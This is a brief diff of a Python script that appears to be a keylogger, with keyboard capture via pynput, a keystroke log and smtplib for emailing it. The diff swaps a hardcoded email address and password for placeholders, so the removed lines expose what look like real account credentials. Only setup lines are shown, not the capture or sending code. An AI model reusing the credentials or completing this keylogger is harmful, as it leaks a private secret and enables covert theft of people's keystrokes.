@@ -3,8 +3,8 @@ import smtplib
 import threading
 #from pynput import keyboard
 log = ""
-email = "raynyt109@gmail.com"
-password = "0321.esk"
+email = "doldur"
+password = "doldur"
 
 
 def callback_function(key):
